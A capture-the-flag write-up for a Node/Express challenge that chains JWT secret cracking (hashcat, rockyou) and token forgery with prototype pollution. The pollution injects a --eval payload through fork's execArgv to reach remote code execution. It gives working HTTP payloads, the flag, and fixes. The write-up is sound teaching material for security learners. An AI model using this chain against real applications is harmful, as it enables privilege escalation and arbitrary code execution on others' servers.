# 10 · mirage (hard)

**Mirage Industrial Systems** internal portal (Node/Express). Two independent
bugs, both required: a weak-HS256 JWT grants admin, and a profile-merge prototype
pollution turns the admin "maintenance job" into remote code execution. The flag
sits at `/flag.txt` with no file-read primitive anywhere — only code execution reaches
it.

## Recon
Sign up and land on the dashboard. Two things stand out:

- A **"Maintenance jobs"** panel that explicitly says your role (`user`) can't run
  jobs — admin only.
- In the **Network tab**, the page silently issues `GET /users/<your-id>`. That
  endpoint isn't linked anywhere in the UI.

The "report a concern" form is a decoy — it never calls the backend.

## Bug 1 — weak HS256 JWT → admin
Auth issues a JWT in the `token` cookie (also returned by `/api/login`):
```
header:  {"alg":"HS256","typ":"JWT"}
payload: {"sub":"<you>","uid":<id>,"role":"user", ...}
```
HS256 is symmetric, so the signing secret is also the verification key. It's a
single dictionary word (an internal codename), crackable offline:
```bash
printf '%s' "$TOKEN" > token.jwt
hashcat -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
# -> secret: fenrir
```
Forge an admin token with the recovered secret (`jwt_tool`, a few lines of Python,
or jwt.io):
```json
{"sub":"admin","uid":1,"role":"admin","iat":...,"exp":...}
```
`GET /admin/maintenance` with this token now returns `200`.

**Why prototype pollution can't shortcut this:** authorization is
```js
if (p && Object.hasOwn(p, 'role') && p.role === 'admin') ...
```
read from the *signature-verified* payload, and every token (users included)
carries an explicit own `role`. Polluting `Object.prototype.role = "admin"` never
satisfies `Object.hasOwn`, and mass-assigning `role`/`isAdmin` into your profile is
ignored by authz. Cracking the secret is the only path to admin.

## Bug 2 — profile-merge prototype pollution
The hidden endpoint accepts POST and deep-merges the JSON body into your profile:
```js
function deepMerge(target, source) {
  for (const key in source) {
    const val = source[key];
    if (val && typeof val === 'object' && !Array.isArray(val)) {
      if (!target[key] || typeof target[key] !== 'object') target[key] = {};
      deepMerge(target[key], val);           // recurses through __proto__
    } else {
      target[key] = val;
    }
  }
}
```
No `__proto__` guard, so a body of `{"__proto__":{...}}` walks into
`Object.prototype`. It's IDOR-locked to your own id (`/users/<your uid>`), so this
is only useful for poisoning the global prototype — not for touching other users
or privilege.

## Chaining to RCE
The admin maintenance job forks a Node worker and returns its captured stdout as
the job log:
```js
function buildJobOptions() {
  const configured = { cwd: __dirname, stdio: ['ignore', 'pipe', 'pipe', 'ipc'] };
  const options = {};
  for (const key in configured) options[key] = configured[key];  // copies inherited props too
  return options;
}
// POST /admin/maintenance awaits the worker and returns { ok, code, log }.
fork(path.join(__dirname, 'jobs', 'worker.js'), [], buildJobOptions());
```
`fork` honors an `execArgv` array (extra `node` flags) on its options object. The
`for..in` copy visits **inherited enumerable** properties, so a polluted
`Object.prototype.execArgv` becomes an *own* property of `options` — and the child
launches with those flags. `--eval` runs arbitrary code with no file drop; print
the flag to stdout and it comes back in the job log:

1. As the **normal user**, pollute the prototype:
   ```http
   POST /users/<your-id>
   Content-Type: application/json

   {"__proto__":{"execArgv":["--eval=console.log(require('fs').readFileSync('/flag.txt','utf8'))"]}}
   ```
2. As **admin** (forged token), trigger the job and read the response:
   ```http
   POST /admin/maintenance
   ->  {"ok":true,"job":"index-rebuild","code":0,"log":"SecurinetsENIT{...}\n"}
   ```

Prototype pollution is process-wide and persistent, so the order is: pollute,
then trigger. The flag returns in the same request that runs the job — no file
drop, no egress. The reference solver (`solve/solve.py`) runs the whole chain.

### A note on "it didn't fire"
The textbook gadget — pollute `execArgv`, pass a bare `{}` to `fork` — does **not**
work on modern Node (20.x): `child_process` copies its options reading *own*
properties only, so the inherited value is stripped. This challenge is exploitable
specifically because the app's config-copy (`for..in`) materializes the inherited
`execArgv` as an own property before the `fork` call. (Pollute `env.NODE_OPTIONS`
instead and you hit the same own-vs-inherited wall unless the app similarly copies
it.)

## Flag
```
SecurinetsENIT{__proto__sl1ps_1nt0_fork_execArgv_th3_m1r4g3_cl34rs}
```

## Fix
- **Secret:** use a long random HS256 key (or asymmetric RS256/ES256 with a private
  signing key); never a dictionary word.
- **Merge:** reject/skip `__proto__`, `constructor`, `prototype` keys; use
  `Object.create(null)` targets, a `Map`, or a vetted merge (`structuredClone` +
  explicit field allow-list). Don't deep-merge attacker JSON into live objects.
- **child_process:** pass a hardened, own-property-only options object and an
  explicit `execArgv: []`; freeze `Object.prototype` (`Object.freeze`) at boot so
  pollution can't take. Validate/allow-list any job configuration.
- **Defense in depth:** authz already reads only the signed claim via
  `Object.hasOwn` — keep it that way; never let a mutable/prototype-reachable flag
  decide privilege.
